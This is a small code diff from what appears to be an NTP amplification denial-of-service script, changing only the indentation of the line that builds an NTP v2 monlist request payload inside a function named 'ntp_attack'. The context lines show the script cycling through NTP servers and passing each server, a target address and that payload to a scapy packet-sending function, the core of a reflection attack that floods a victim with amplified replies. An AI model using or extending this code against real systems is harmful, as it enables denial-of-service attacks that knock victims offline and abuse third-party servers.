@@ -76,7 +76,7 @@ def ntp_attack():
 	current_server = current_server + 1 
 	
 	# Pattern for NTP v2 Monlist Packet
-    ntp_data_pattern = "\x17\x00\x03\x2a" + "\x00" * 4
+	ntp_data_pattern = "\x17\x00\x03\x2a" + "\x00" * 4
 
 	#Calling the scapy packet function.
 	scapy_packet(ntp_server, target_address, ntp_data_pattern)
